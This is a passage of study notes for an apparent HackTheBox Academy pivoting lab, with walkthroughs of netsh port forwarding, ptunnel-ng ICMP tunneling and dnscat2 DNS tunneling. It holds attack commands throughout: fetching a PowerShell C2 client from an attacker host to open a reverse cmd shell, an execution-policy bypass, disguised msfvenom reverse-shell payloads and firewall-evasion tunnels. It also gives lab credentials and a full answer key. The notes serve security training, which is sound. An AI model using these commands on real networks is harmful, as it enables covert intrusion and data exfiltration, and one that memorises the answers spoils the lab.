Use netsh port forwarding when you have RDP or shell access to a Windows pivot host and need to forward a specific port into the internal network. It is ideal for simple single-port forwarding scenarios like making an internal RDP service accessible from outside. Unlike SOCKS proxies it only forwards specific ports, not arbitrary traffic.

### Traffic Flow

```
Attack Host (Pwnbox)
  │ xfreerdp /v:10.129.42.198:8080
  ▼
Windows 10 Pivot (10.129.42.198)
  │ netsh portproxy rule:
  │ incoming :8080 → 172.16.5.19:3389
  ▼
Internal DC (172.16.5.19:3389)
  │ RDP session as victor
  ▼
Open VendorContacts.txt → FLAG!
```

### How We Solved It

**Step by step execution that worked:**

1. RDP into Windows 10 pivot first
2. Opened CMD as Administrator
3. Created netsh portproxy rule
4. Added firewall exception for port 8080
5. From Pwnbox: xfreerdp to Windows 10 pivot on port 8080
6. Logged in as victor — DC desktop appeared
7. Navigated to Desktop → Approved Vendors → VendorContacts.txt
8. Found the answer: **Jim Flipflop**

### Commands Performed

```bash
# STEP 1: From attack host — RDP into Windows 10 pivot host
xfreerdp /v:10.129.42.198 /u:htb-student /p:'HTB_@cademy_stdnt!' /cert:ignore /sec:tls
# This gives you the Windows 10 desktop (pivot host)
# NOT the DC — this is just the stepping stone machine

# STEP 2: Inside Windows 10 RDP — open CMD as Administrator
# Win key → type cmd → Right click → Run as administrator

# STEP 3: Create the netsh port forward rule
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.19
# v4tov4 = IPv4 to IPv4 forwarding
# listenport=8080 = Windows 10 will listen on port 8080
# listenaddress=10.129.42.198 = listen on this interface (the one facing attack host)
# connectport=3389 = forward to RDP port
# connectaddress=172.16.5.19 = forward to the DC (internal)

# STEP 4: Verify the rule was created correctly
netsh.exe interface portproxy show v4tov4
# Output should show:
# Listen on ipv4:          Connect to ipv4:
# Address      Port        Address       Port
# 10.129.42.198  8080      172.16.5.19   3389

# STEP 5: Add Windows firewall exception for port 8080
netsh advfirewall firewall add rule name="RDP Pivot" protocol=TCP dir=in localport=8080 action=allow
# Without this rule Windows Defender blocks incoming connections on 8080
# name="RDP Pivot" = just a label for the rule
# dir=in = inbound traffic rule
# action=allow = permit the connection

# STEP 6: From attack host (NEW terminal) — RDP to DC through the pivot
xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123 /d:inlanefreight.local /cert:ignore /sec:tls
# /v:10.129.42.198:8080 = connect to Windows 10 on port 8080
# netsh automatically forwards this to 172.16.5.19:3389
# /u:victor = DC credentials (not Windows 10 credentials!)
# /d:inlanefreight.local = domain (prevents Kerberos issues)

# STEP 7: Find the flag on the DC desktop
# In the RDP session (now on DC as victor):
type "C:\Users\victor\Desktop\Approved Vendors\VendorContacts.txt"
# OR navigate via File Explorer:
# Desktop → Approved Vendors folder → VendorContacts.txt

# STEP 8 (Cleanup): Remove the netsh rule when done
netsh.exe interface portproxy delete v4tov4 listenport=8080 listenaddress=10.129.42.198
netsh advfirewall firewall delete rule name="RDP Pivot"
```

### Lab Answer

**"Submit the approved contact's name found inside VendorContacts.txt"**

File contents:
```
- In case of incident contact:
Jim Flipflop
123-123-1234
CAT5 Security
```

**Answer: `Jim Flipflop`**

---

## 14. ICMP Tunneling with ptunnel-ng

### 14.1 What is ICMP Tunneling?

ICMP (Internet Control Message Protocol) is the protocol used by the `ping` command. It is one of the most commonly allowed protocols in firewalls because network administrators use it for basic connectivity testing. ICMP tunneling is a technique where an attacker hides real network traffic (like SSH or TCP data) inside ICMP echo request and reply packets (ping packets). The firewall sees only normal ping traffic and does not block it, but underneath, full data communication is happening. This is extremely useful during a penetration test when all TCP and UDP ports are blocked but ICMP is still allowed. The tool we use for this is called **ptunnel-ng**, which stands for "Ping Tunnel Next Generation". It wraps your TCP traffic inside ICMP packets and sends it through the network, completely hidden from basic firewall inspection.

### 14.2 Why Use ptunnel-ng?

ptunnel-ng is chosen because it is open source, actively maintained, and supports encrypted tunneling over ICMP. It works in a client-server model — the server runs on the compromised pivot host inside the target network, and the client runs on your attack machine. Once the tunnel is up, you can forward any TCP port through it, including SSH port 22. This means you can SSH into the pivot host through pure ICMP traffic. After establishing SSH, you can then layer dynamic port forwarding on top to create a SOCKS proxy, giving you full access to the internal network. ptunnel-ng is particularly valuable when you are on an engagement and the client has very strict firewall rules that only allow ICMP, which is a real-world scenario in many corporate environments.

### 14.3 Setting Up ptunnel-ng — Build on Attack Host

```bash
# Clone the ptunnel-ng repository from GitHub to your attack host
git clone https://github.com/utoni/ptunnel-ng.git

# Move into the cloned directory
cd ptunnel-ng

# Run the autogen.sh script to configure and compile the binary
# This script sets up the build environment and compiles ptunnel-ng
sudo ./autogen.sh
```

**Why these commands?**
- `git clone` downloads the source code from GitHub since ptunnel-ng is not in most package managers.
- `autogen.sh` is a build automation script that runs `./configure` and `make` for you automatically, creating the compiled binary in the `src/` folder.
- We need `sudo` because building may require access to system libraries.

### 14.4 Building a Static Binary (Fixes GLIBC / libcrypto Errors)

If you transfer the default binary to the pivot and get errors like `libcrypto.so.3: cannot open shared object file` or `GLIBC_2.34 not found`, it means the pivot is running an older OS (Ubuntu 20.04 has GLIBC 2.31) that does not have the newer libraries your binary was compiled against. The solution is to build a **static binary** — one that bundles all its library dependencies inside itself and does not need any external `.so` files on the target system.

```bash
# Install the tools required to build static binaries
sudo apt install automake autoconf libpcap-dev libssl-dev -y

# Move into the ptunnel-ng directory
cd ptunnel-ng

# This sed command modifies the last line of autogen.sh to add
# LDFLAGS=-static which tells the compiler to link everything statically
# --enable-static tells configure to build a self-contained binary
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh

# Now run autogen.sh — this time it will produce a static binary
sudo ./autogen.sh
```

**Why static?**
- A static binary carries all its needed libraries (libcrypto, libpcap, libc) baked in.
- It will run on ANY Linux system regardless of which library versions are installed.
- This solves both GLIBC mismatch and missing libcrypto errors in one go.

### 14.5 Transferring the Binary to the Pivot Host

```bash
# Transfer ONLY the compiled binary to the pivot host
# We rename it to ptunnel-ng-bin to avoid conflict with the existing folder
# named ptunnel-ng that was transferred earlier
scp ptunnel-ng/src/ptunnel-ng ubuntu@10.129.182.64:~/ptunnel-ng-bin
# Password: HTB_@cademy_stdnt!
```

**Why rename to ptunnel-ng-bin?**
- If you previously transferred the whole `ptunnel-ng` folder to the pivot, a directory named `ptunnel-ng` already exists in the home folder.
- SCP cannot create a file with the same name as an existing directory.
- Naming it `ptunnel-ng-bin` avoids this conflict completely.

### 14.6 Starting the ptunnel-ng Server on the Pivot Host

The pivot host is the Ubuntu machine at `10.129.182.64`. It sits between your attack host and the internal network. You run the ptunnel-ng **server** on it so that it listens for incoming ICMP packets from your attack machine.

```bash
# SSH into the pivot host first
ssh ubuntu@10.129.182.64
# Password: HTB_@cademy_stdnt!

# Make the binary executable and start the server
chmod +x ~/ptunnel-ng-bin
sudo ./ptunnel-ng-bin -r10.129.182.64 -R22
```

**Flag explanation:**
- `-r10.129.182.64` — This is the IP address the server listens on. We use the pivot's **external IP** (ens192 interface, reachable from attack host). We do NOT use `172.16.5.129` because that is the internal interface and the attack host cannot reach it directly.
- `-R22` — This is the TCP port that ptunnel-ng will forward traffic to. Port 22 is SSH, meaning once the ICMP tunnel is up, it will create a pathway to SSH on the pivot.

**Expected output:**
```
[inf]: Starting ptunnel-ng 1.42.
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

### 14.7 Starting the ptunnel-ng Client on the Attack Host

Open a **new terminal** on your attack host. The client connects to the server over ICMP and creates a local TCP port (2222) that acts as the entry point to the tunnel.

```bash
# Run the ptunnel-ng client from your attack host
sudo ./ptunnel-ng/src/ptunnel-ng -p10.129.182.64 -l2222 -r10.129.182.64 -R22
```

**Flag explanation:**
- `-p10.129.182.64` — IP of the ptunnel-ng **server** (the pivot host we want to connect to).
- `-l2222` — Local TCP port to open on your attack host. Connecting to `127.0.0.1:2222` will route traffic through the ICMP tunnel.
- `-r10.129.182.64` — Remote host to forward to on the other side (the pivot itself).
- `-R22` — Remote port to reach (SSH port 22 on the pivot).

**Expected output:**
```
[inf]: Starting ptunnel-ng 1.42.
[inf]: Relaying packets from incoming TCP streams.
```

### 14.8 SSH Through the ICMP Tunnel with Dynamic Port Forwarding

Now that the tunnel is established, open a **third terminal**. Instead of connecting normally over TCP port 22, you connect to `127.0.0.1:2222` — your local tunnel entry point. You also add `-D 9050` to create a SOCKS proxy at the same time, giving you full access to the internal network.

```bash
# SSH through the ICMP tunnel, also creating a SOCKS5 proxy on port 9050
ssh -D 9050 -p2222 -l ubuntu 127.0.0.1
# Password: HTB_@cademy_stdnt!
```

**Flag explanation:**
- `-D 9050` — Creates a dynamic SOCKS5 proxy on your local port 9050. All tools using proxychains will route through this port into the internal network.
- `-p2222` — Connect to port 2222 (our ptunnel-ng local listener) instead of port 22 directly.
- `-l ubuntu` — Login as the user `ubuntu` on the pivot.
- `127.0.0.1` — Connect to localhost because ptunnel-ng client is listening locally, not at a remote IP.

### 14.9 Configure proxychains and RDP to the Domain Controller

```bash
# Edit proxychains config to use port 9050 (our SOCKS proxy)
sudo nano /etc/proxychains.conf

# Make sure [ProxyList] section at the bottom looks like this:
# [ProxyList]
# socks5 127.0.0.1 9050

# Verify the setting
tail -5 /etc/proxychains.conf

# RDP to the Domain Controller through the ICMP tunnel
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /d:inlanefreight.local /cert:ignore
```

**Traffic flow:**
```
Attack host → ptunnel-ng client (local:2222)
           → ICMP packets → pivot (10.129.182.64)
           → ptunnel-ng server → SSH (port 22)
           → SOCKS proxy (9050)
           → proxychains → DC (172.16.5.19) RDP
```

**Get the flag:**
Once the RDP session opens, navigate to:
```
C:\Users\victor\Downloads\flag.txt
```
> Note: This lab flag is in **Downloads**, not Documents.

---

## 15. DNS Tunneling with dnscat2

### 15.1 What is DNS Tunneling?

DNS (Domain Name System) is the protocol that translates domain names like `google.com` into IP addresses. Every corporate network relies on DNS and almost no firewall blocks outbound DNS traffic — doing so would break the entire internet for users. DNS tunneling exploits this trust by hiding data inside DNS query and response packets. Instead of resolving real domain names, the tool sends encoded data as part of DNS TXT record requests. To the firewall and network monitoring tools, it looks like normal DNS lookups. This makes it one of the stealthiest data exfiltration and C2 (Command and Control) methods available. **dnscat2** is the most popular tool for DNS tunneling in penetration testing. It creates an encrypted, authenticated tunnel over DNS that can carry command shells, file transfers, and port forwards — all without triggering most firewall rules.

### 15.2 How dnscat2 Works

dnscat2 works in two parts — a **server** running on your attack host and a **client** running on the target Windows machine. The server listens on UDP port 53 (DNS port) and pretends to be a DNS server for a domain you control (in this case `inlanefreight.local`). When the client on Windows wants to send data, it makes DNS TXT record requests to your fake DNS domain. These requests carry encoded data out to your server. The server decodes the data, processes it, and sends responses back as DNS replies. This creates a full two-way communication channel that is disguised as regular DNS traffic. The connection is also encrypted using a pre-shared secret key that both sides must know, making it impossible for a defender to read the content even if they capture the DNS packets.

### 15.3 Why dnscat2 Over Other Tools?

dnscat2 is chosen for DNS tunneling specifically because it supports full **C2 (command and control)** capabilities, not just simple data exfiltration. You can run command shells through it, create port forwards, and manage multiple sessions simultaneously. It uses **encryption with a pre-shared secret** so traffic cannot be read by defenders. The PowerShell client (`dnscat2-powershell`) means you do not need to upload a compiled binary to the Windows target — just a `.ps1` script, which is much harder to detect and block. It works over **UDP port 53** which is almost universally allowed outbound in corporate firewalls, making it a reliable last-resort communication channel when everything else is blocked.

### 15.4 Setting Up the dnscat2 Server on Attack Host

```bash
# Clone the dnscat2 server repository to your attack host
git clone https://github.com/iagox86/dnscat2.git

# Move into the server directory — the Ruby server lives here
cd dnscat2/server/

# Install bundler — a Ruby package manager that manages gem dependencies
sudo gem install bundler

# Install all Ruby gems (dependencies) that dnscat2 server needs
sudo bundle install
```

**Why Ruby?**
- The dnscat2 server is written in Ruby, a scripting language.
- `gem` is Ruby's package manager (like pip for Python or npm for Node.js).
- `bundler` reads the `Gemfile` in the project and installs exactly the right versions of each dependency.
- This ensures the server runs correctly without version conflicts.

### 15.5 Starting the dnscat2 Server

```bash
# Start the dnscat2 server — replace 10.10.14.18 with YOUR tun0 IP
# Find your IP first with: ip addr show tun0
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

**Flag explanation:**
- `--dns host=10.10.14.18` — The IP address the DNS server listens on. This must be your **tun0** (VPN tunnel) IP so the Windows target can reach it. Do NOT use eth0 or any other interface.
- `port=53` — DNS uses UDP port 53. We listen on this standard port so DNS queries from the target reach us.
- `domain=inlanefreight.local` — The fake domain we are pretending to be authoritative for. DNS queries for `*.inlanefreight.local` will carry our tunnel data.
- `--no-cache` — Disables DNS caching so every query goes through fresh, ensuring no data is lost or delayed.

**Expected output:**
```
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
```

> **IMPORTANT:** Copy the `--secret=XXXXXXXX` value. You need this exact secret on the Windows client side.

### 15.6 Getting the PowerShell Client

```bash
# Open a second terminal on your attack host
# Clone the PowerShell-based dnscat2 client
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Move into the directory — dnscat2.ps1 is the file we need
cd dnscat2-powershell
ls
# You should see: dnscat2.ps1
```

**Why a PowerShell client?**
- The target is a Windows machine. We cannot easily compile and run a Linux binary on Windows.
- A PowerShell script (`.ps1`) runs natively on any modern Windows system without installing anything.
- PowerShell scripts are harder to detect than compiled `.exe` files in many endpoint protection setups.
- It also bypasses the need to transfer a binary, reducing our footprint on the target.

---

## 16. Full Lab Walkthrough — dnscat2 (Step by Step)

### 16.1 Step 1 — RDP into the Windows Target

Before anything else, connect to the Windows target machine so you have a session ready to run the PowerShell client. You need this RDP session open throughout the entire exercise.

```bash
# From your attack host, RDP into the Windows target
xfreerdp /v:10.129.182.39 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

**Why RDP first?**
- You need a Windows GUI or PowerShell terminal to import and run the dnscat2 PowerShell script.
- Establishing the RDP session first confirms the target is reachable before you spend time setting up the server.
- Keep this window open — you will use it in Step 6 and 7.

### 16.2 Step 2 — Find Your Pwnbox VPN IP (tun0)

```bash
# Show all network interfaces with their IP addresses briefly
ip -br addr

# Or show just the tun0 interface details
ip addr show tun0
```

**Why tun0?**
- When connected to HTB via VPN, your attack machine gets a virtual network interface called `tun0`.
- `tun0` is the interface that routes traffic into the HTB lab network.
- The Windows target machine can only reach your attack host via this VPN IP (e.g., `10.10.14.18`).
- If you use `eth0` or any other interface IP, the Windows target will not be able to reach your dnscat2 server and the tunnel will never connect.

**Example output:**
```
tun0    UP    10.10.14.43/23
```
Your `tun0` IP in this case is `10.10.14.43`. Use YOUR actual IP everywhere below.

### 16.3 Step 3 — Install dnscat2 on Attack Host

```bash
# Go to home directory
cd ~

# Clone the dnscat2 server code
git clone https://github.com/iagox86/dnscat2.git

# Move into the server folder
cd dnscat2/server

# Install Ruby's bundler package manager
sudo gem install bundler

# Install all required Ruby libraries listed in Gemfile
sudo bundle install
```

**What each command does:**
- `git clone` — Downloads the dnscat2 source code and all its files from GitHub.
- `cd dnscat2/server` — The server Ruby script lives in the `server/` subdirectory, not the root.
- `gem install bundler` — Bundler manages Ruby gem (library) versions so they do not conflict.
- `bundle install` — Reads `Gemfile.lock` and installs the exact library versions dnscat2 needs to function.

### 16.4 Step 4 — Start the dnscat2 DNS Server

```bash
# Start dnscat2 server — use YOUR actual tun0 IP here
sudo ruby dnscat2.rb --dns host=10.10.14.43,port=53,domain=inlanefreight.local --no-cache
```

**Why sudo?**
- Listening on port 53 (any port below 1024) requires root/sudo privileges on Linux.
- Without sudo, the server will fail to bind to port 53 and exit with a permission error.

**What happens:**
- The server starts a fake DNS server on your machine.
- It waits for DNS queries arriving at port 53 for the domain `inlanefreight.local`.
- It prints a **pre-shared secret key** — this is your tunnel authentication password.
- Leave this terminal running — closing it kills the tunnel.

**Copy the secret key shown:**
```
./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
```
Your secret is `0ec04a91cd1e963f8c03ca499d589d21` (yours will be different).

### 16.5 Step 5 — Get the PowerShell Client Ready

```bash
# Open a NEW second terminal on your attack host
cd ~

# Clone the PowerShell dnscat2 client
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Enter the directory
cd dnscat2-powershell

# List files to confirm dnscat2.ps1 is present
ls
```

**Now start a temporary HTTP server to serve the file to Windows:**
```bash
# Start Python HTTP server in the current directory
# This lets the Windows machine download dnscat2.ps1 via HTTP
python3 -m http.server 8000 --bind 0.0.0.0
```

**Why Python HTTP server?**
- The Windows target needs to download `dnscat2.ps1` somehow.
- A simple Python HTTP server is the fastest way to host a file for download.
- `--bind 0.0.0.0` makes it available on all interfaces including tun0.
- Port 8000 is a non-standard port that is usually not blocked on lab environments.

### 16.6 Step 6 — Transfer dnscat2.ps1 to Windows

Switch to your **RDP session** on the Windows target. Open **PowerShell as Administrator**:

```powershell
# Navigate to the Downloads folder
cd C:\Users\htb-student\Downloads

# Download dnscat2.ps1 from your attack host HTTP server
# Replace 10.10.14.43 with YOUR actual tun0 IP
Invoke-WebRequest http://10.10.14.43:8000/dnscat2.ps1 -OutFile dnscat2.ps1

# Verify the file was downloaded
dir .\dnscat2.ps1
```

**Why Invoke-WebRequest?**
- `Invoke-WebRequest` is PowerShell's built-in HTTP download command (similar to `wget` or `curl` on Linux).
- `-OutFile dnscat2.ps1` saves the downloaded content to a file named `dnscat2.ps1` in the current directory.
- No extra tools or admin rights are needed for this — it is a native PowerShell cmdlet.
- If this fails, try: `(New-Object Net.WebClient).DownloadFile('http://10.10.14.43:8000/dnscat2.ps1','dnscat2.ps1')`

### 16.7 Step 7 — Import and Run dnscat2 on Windows

Still in the Windows PowerShell session:

```powershell
# Import the dnscat2 PowerShell module into the current session
# This loads all the functions defined in dnscat2.ps1 into memory
Import-Module .\dnscat2.ps1

# Start the DNS tunnel back to your attack host
# Replace IP and secret with YOUR values
Start-Dnscat2 -DNSserver 10.10.14.43 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

**Flag explanation:**
- `Import-Module .\dnscat2.ps1` — Loads the script so the `Start-Dnscat2` function becomes available. Without this, PowerShell does not know what `Start-Dnscat2` is.
- `-DNSserver 10.10.14.43` — The IP of your attack host where the dnscat2 server is running. DNS queries will be sent here.
- `-Domain inlanefreight.local` — The domain to send DNS queries for. Must match what the server is listening for.
- `-PreSharedSecret` — The secret key from the server output. Both sides must have the same secret or the connection is rejected.
- `-Exec cmd` — Tells dnscat2 to spawn a `cmd.exe` shell and send it back through the tunnel to your server.

**If you get an execution policy error:**
```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
```

### 16.8 Step 8 — Confirm the Session on Your Attack Host

Go back to **Terminal 1** (where dnscat2 server is running). You should see:

```
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
```

**Interact with the session:**
```
dnscat2> windows
# Lists all active sessions

dnscat2> window -i 1
# Opens session number 1 — your Windows CMD shell
```

**Why window -i 1?**
- dnscat2 manages multiple sessions as "windows" (like terminal tabs).
- `windows` lists all sessions with their IDs.
- `window -i 1` switches you into session 1 where your cmd.exe shell is running.
- Once inside, anything you type is sent to the Windows machine and output comes back over DNS.

### 16.9 Step 9 — Read the Flag Through the DNS Tunnel

Inside the dnscat2 shell session (which is a Windows cmd.exe):

```cmd
type C:\Users\htb-student\Documents\flag.txt
```

**Alternative if above path does not work:**
```cmd
dir C:\Users\htb-student\
type C:\Users\htb-student\Desktop\flag.txt
```

**Why `type` instead of `cat`?**
- `type` is the Windows CMD equivalent of Linux's `cat` command.
- It prints the contents of a text file to the screen.
- `cat` does not exist in Windows CMD (only in PowerShell).

---

## 17. When to Use Each Technique

| Situation | Technique to Use |
|---|---|
| Need to access ONE specific service on the pivot host (e.g. MySQL, web) | **SSH Local Port Forwarding** (`ssh -L`) |
| Need to scan/access MULTIPLE hosts or services in an internal network | **SSH Dynamic Port Forwarding** (`ssh -D` + proxychains) |
| Need an RDP/graphical session on an internal Windows machine | **Dynamic Port Forwarding** + xfreerdp via proxychains |
| Need to catch a reverse shell from an internal machine that can't reach you | **SSH Reverse Port Forwarding** (`ssh -R`) |
| Already have Meterpreter on pivot host, want to scan internal network | **Meterpreter AutoRoute** + socks_proxy module |
| Want to forward a specific port through Meterpreter (e.g. RDP direct) | **Meterpreter portfwd** (`portfwd add`) |
| Need a reverse shell from Windows through an existing Meterpreter session | **Meterpreter Reverse portfwd** (`portfwd add -R`) |
| SSH not available, only Meterpreter session exists | **Meterpreter Tunneling** (autoroute + socks_proxy) |
| Quick TCP relay, no SSH overhead needed | **Socat** |
| Catch reverse shell via socat relay | **Socat + Metasploit** |
| Bind shell through pivot (you connect in) | **Socat bind + bind_tcp payload** |
| Simplest pivot, use tools without proxychains | **Sshuttle** |
| Pivot host makes outbound, firewall blocks inbound SSH | **Rpivot** |
| Corporate NTLM proxy blocking tunnel | **Rpivot with NTLM auth** |
| Windows attack host, need SSH tunnel | **Plink.exe** |
| Windows attack host, route app traffic | **Proxifier** |
| Compromise dual-homed Windows, forward port | **Netsh portproxy** |
| Only ICMP (ping) allowed through firewall | **ptunnel-ng** |
| Only DNS allowed through firewall (most stealthy) | **dnscat2** |

### Protocol Reference Table

| Technique | Protocol Used | Best When | Tool |
|---|---|---|---|
| ICMP Tunnel | ICMP (ping) | Only ping is allowed through firewall | ptunnel-ng |
| DNS Tunnel | DNS (UDP 53) | DNS is allowed, everything else blocked | dnscat2 |
| SSH Dynamic | SSH (TCP 22) | SSH access to pivot is available | ssh -D |
| VPN-style | SSH (TCP 22) | SSH available, want no proxychains | sshuttle |
| Reverse SOCKS | TCP (any) | Pivot host can only make outbound connections | rpivot |
| TCP Relay | TCP (any) | Need quick redirect, no SSH overhead | socat |
| Windows Pivot | TCP (any) | Compromised Windows dual-homed host | netsh |

---

## 18. All Lab Answers Summary

| Section | Question | Answer |
|---|---|---|
| SSH Local Port Forward | How many NICs on Ubuntu pivot host? | 3 |
| SSH Dynamic Forward | Which Ubuntu IP talks to Windows? | 172.16.5.129 |
| SSH Dynamic Forward | What IP makes MSF listen everywhere? | 0.0.0.0 |
| Meterpreter Tunneling | Two IPs from ping sweep? | 172.16.5.19, 172.16.5.129 |
| Meterpreter Tunneling | Which AutoRoute route covers 172.16.5.19? | 172.16.5.0/255.255.254.0 |
| Remote/Reverse SSH | Which Ubuntu IP communicates with Windows? | 172.16.5.129 |
| Remote/Reverse SSH | What IP does MSF handler listen on? | 0.0.0.0 |
| Socat Reverse Shell | SSH tunneling required with socat? | False |
| Socat Bind Shell | What payload catches bind shell session? | windows/x64/meterpreter/bind_tcp |
| Sshuttle | Optional exercise answer | I tried sshuttle |
| Rpivot | Where does server.py run? | Attack Host |
| Rpivot | Where does client.py run? | Pivot Host |
| Plink | Optional exercise answer | I tried Plink |
| Netsh Port Forward | Approved contact in VendorContacts.txt? | Jim Flipflop |

---

## 19. Quick Reference Cheatsheet

### SSH Commands

```bash
# Local port forward (access remote service locally)
ssh -L <localport>:localhost:<remoteport> user@pivothost

# Dynamic port forward (full SOCKS proxy)
ssh -D 9050 user@pivothost

# Reverse port forward (catch reverse shells through pivot)
ssh -R <pivotIP>:<pivotport>:0.0.0.0:<localport> user@pivothost -vN

# Forward multiple local ports
ssh -L 1234:localhost:3306 -L 8080:localhost:80 user@pivothost

# SSH through ICMP tunnel with SOCKS proxy
ssh -D 9050 -p2222 -l ubuntu 127.0.0.1
```

### Proxychains

```bash
# Verify config
tail -4 /etc/proxychains.conf
# Must contain: socks4  127.0.0.1 9050

# Use any tool through SOCKS proxy
proxychains nmap -v -Pn -sT <target>
proxychains xfreerdp /v:<target> /u:<user> /p:<pass> /d:<domain> /cert:ignore /sec:tls
proxychains msfconsole
proxychains curl -s http://172.16.5.135:80
```

### Msfvenom Payloads

```bash
# Linux Meterpreter (for pivot host)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attackIP> LPORT=8080 -f elf -o backupjob

# Windows Meterpreter via HTTPS (for reverse SSH port forward / socat)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<pivotInternalIP> LPORT=8080 -f exe -o backupscript.exe

# Windows Meterpreter via TCP (for Meterpreter reverse portfwd)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<pivotInternalIP> LPORT=1234 -f exe -o backupscript.exe

# Windows Bind shell (no LHOST needed)
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o backupjob.exe
```

### Metasploit Modules

```bash
# Generic handler
use exploit/multi/handler
set payload <payload>
set LHOST 0.0.0.0
set LPORT <port>
run

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run

# AutoRoute (add routes through Meterpreter)
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

# Or from inside Meterpreter session:
run autoroute -s 172.16.5.0/23
run autoroute -p
```

### Meterpreter portfwd

```bash
# Forward local port to remote (access internal RDP locally)
portfwd add -l 3300 -p 3389 -r 172.16.5.19

# Reverse port forward (catch reverse shell through pivot)
portfwd add -R -l 8081 -p 1234 -L <attackIP>

# List all forwards
portfwd list

# Remove a forward
portfwd delete -i <index>
```

### Socat

```bash
# Reverse shell redirector on pivot host
socat TCP4-LISTEN:8080,fork TCP4:<attackIP>:8000

# Bind shell redirector on pivot host
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Kill existing socat
sudo pkill socat
```

### Sshuttle

```bash
# Install
sudo apt-get install sshuttle -y

# Start tunnel (routes all internal traffic automatically)
sudo sshuttle -r ubuntu@<pivotIP> 172.16.5.0/23 -v

# Then use tools directly — NO proxychains needed
nmap -v -sT -p3389 172.16.5.19 -Pn
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /d:inlanefreight.local /cert:ignore /sec:tls
```

### Rpivot

```bash
# Clone
git clone https://github.com/klsecservices/rpivot.git

# Attack host — start server
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Transfer to pivot
scp -r rpivot ubuntu@<pivotIP>:/home/ubuntu/

# Pivot host — run client
python2 client.py --server-ip <attackIP> --server-port 9999

# With NTLM proxy
python2 client.py --server-ip <AttackIP> --server-port 8080 --ntlm-proxy-ip <ProxyIP> --ntlm-proxy-port 8081 --domain <Domain> --username <user> --password <pass>
```

### Netsh (Windows)

```bash
# Create port forward rule (run as Admin in Windows CMD)
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=<winPivotIP> connectport=3389 connectaddress=172.16.5.19

# Add firewall rule
netsh advfirewall firewall add rule name="Pivot" protocol=TCP dir=in localport=8080 action=allow

# Show rules
netsh.exe interface portproxy show v4tov4

# Delete rule (cleanup)
netsh.exe interface portproxy delete v4tov4 listenport=8080 listenaddress=<winPivotIP>
netsh advfirewall firewall delete rule name="Pivot"

# RDP through netsh forward from attack host
xfreerdp /v:<winPivotIP>:8080 /u:victor /p:pass@123 /d:inlanefreight.local /cert:ignore /sec:tls
```

### ptunnel-ng (ICMP Tunnel)

```bash
# Clone and build static binary
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo apt install automake autoconf libpcap-dev libssl-dev -y
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
sudo ./autogen.sh

# Transfer to pivot
scp ptunnel-ng/src/ptunnel-ng ubuntu@<pivotIP>:~/ptunnel-ng-bin

# On pivot — start server
sudo ./ptunnel-ng-bin -r<pivotIP> -R22

# On attack host — start client
sudo ./ptunnel-ng/src/ptunnel-ng -p<pivotIP> -l2222 -r<pivotIP> -R22

# SSH through ICMP tunnel with SOCKS proxy
ssh -D 9050 -p2222 -l ubuntu 127.0.0.1
```

### dnscat2 (DNS Tunnel)

```bash
# Setup server
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
sudo gem install bundler
sudo bundle install

# Start server (use tun0 IP)
sudo ruby dnscat2.rb --dns host=<tun0IP>,port=53,domain=inlanefreight.local --no-cache
# COPY the --secret value shown!

# Get PowerShell client
git clone https://github.com/lukebaggett/dnscat2-powershell.git
cd dnscat2-powershell
python3 -m http.server 8000 --bind 0.0.0.0

# On Windows (PowerShell as Admin)
Invoke-WebRequest http://<tun0IP>:8000/dnscat2.ps1 -OutFile dnscat2.ps1
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <tun0IP> -Domain inlanefreight.local -PreSharedSecret <secret> -Exec cmd

# Interact with session on attack host
dnscat2> windows
dnscat2> window -i 1

# Read flag in Windows CMD shell
type C:\Users\htb-student\Documents\flag.txt
```

### Key Points to Remember

- **ICMP tunnel** — traffic looks like ping. Good for firewall bypass. Slow. Needs root on both ends.
- **DNS tunnel** — traffic looks like DNS lookups. Very stealthy. Works in almost every network. Slower than TCP.
- **ptunnel-ng** — always build static binary on engagements to avoid library version issues.
- **dnscat2 secret** — the pre-shared secret is generated fresh each server start. Always copy it before connecting the client.
- **tun0 IP** — always use your VPN tunnel interface IP, never eth0 or localhost for server-side listening.
- **Port 53** — requires sudo/root to bind. Always run dnscat2 server with sudo.
- **proxychains port** — ICMP lab uses port 9050. Make sure proxychains.conf matches the SOCKS port you opened with SSH -D.
- **Flag locations** — ICMP lab flag is in `Downloads`, DNS lab flag is in `Documents`. Always check the question carefully.

---

